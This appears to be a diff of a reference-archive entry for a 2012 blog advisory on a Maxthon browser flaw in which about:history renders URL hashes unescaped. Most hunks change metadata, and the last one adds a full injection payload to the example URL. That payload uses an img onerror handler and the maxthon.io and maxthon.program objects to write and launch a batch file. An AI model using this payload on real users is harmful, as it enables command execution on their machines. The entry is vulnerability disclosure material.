@@ -3,12 +3,12 @@ type: Article
 title: "malerisch.net: Maxthon - Cross Context Scripting (XCS) - about:history"
 description: "Maxthon's about:history page renders visited-URL text unescaped, so a location.hash payload on any attacker page lands inside the privileged mx://res zone. From there the maxthon.io and maxthon.program DOM objects give file read and write and command execution; a Metasploit module overwrites j2plauncher.exe to get code running on Windows 7."
 resource: "https://web.archive.org/web/20170903113359/http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html"
-tags: [article, webseclist-reference, blog-malerisch-net, xss, rce, sop-bypass, cve, sandbox-escape, javascript, privilege-escalation, owasp-a01-2021, owasp-a03-2021]
+tags: [article, webseclist-reference, en-GB, blog-malerisch-net, xss, rce, sop-bypass, cve, sandbox-escape, javascript, privilege-escalation, owasp-a01-2021, owasp-a03-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-11T17:34:09+00:00"
+  at: "2026-08-16T00:00:34+00:00"
 status: deprecated
-stale_after: 2027-08-11
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://web.archive.org/web/20170903113359/http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html"
@@ -26,11 +26,11 @@ cited_by:
   - "2012.md:62"
   - "2012.md:62"
 commit: ""
-content_sha256: 19bac56a789c6651e71e7b4d09b7a901625c14874f2237d1c42086129319465c
+content_sha256: 236ee316cf42dfe44ae4d0286b3f93f068fc87d8b9c8aef41b2c5c3ad9ad90cb
 depth: full
 depth_reason: default
 kind: article
-language: ""
+language: en-GB
 licence: unknown
 original_url: "https://web.archive.org/web/20170903113359/http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html"
 published: ""
@@ -39,7 +39,7 @@ publisher_english: ""
 raw_sha256: a8f4aaa6ead5c12946e14dd4380993201e1913393c416c050210b3591ce7e0a6
 retrieved_from: "http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html"
 retrieved_kind: stored
-retrieved_utc: "2026-08-11T17:34:09+00:00"
+retrieved_utc: "2026-08-16T00:00:34+00:00"
 slug: blog-malerisch-net-maxthon-cross-context-scripting-xcs-about-history
 snapshot: 20130522055255
 title_english: ""
@@ -54,7 +54,7 @@ translation_of: ""
 - Published: date not stated
 - Original: <https://web.archive.org/web/20170903113359/http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html>
 - Current location: <http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html>
-- Preserved from: http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html (stored) on 2026-08-11
+- Preserved from: http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html (stored) on 2026-08-16
 - Capture timestamp: 20130522055255
 - Licence: unknown
 
@@ -87,7 +87,7 @@ page going offline. To read the original, follow the link above.
 
  A malicious user can inject arbitrary JavaScript/HTML code through the websites visited with the Maxthon browser. The code injection is rendered into the History page (about:history), which displays URL and a short description of the visited pages. A malicious user can inject JavaScript/HTML content by using the location.hash property, as shown below:
 
- http://x.x.x.x/maliciouspage.html**#"><img src=a >**
+ http://x.x.x.x/maliciouspage.html**#"><img src=a onerror='var b= new maxthon.io.File.createTempFile("test","bat");c=maxthon.io.File(b);maxthon.io.FileWriter(b);maxthon.io.writeText("cmd /k dir");maxthon.program.Program.launch(b.name_,"C:")'>**
 
  Injected payload is rendered in both the <img> and <a> elements of a history item, as shown below:
 
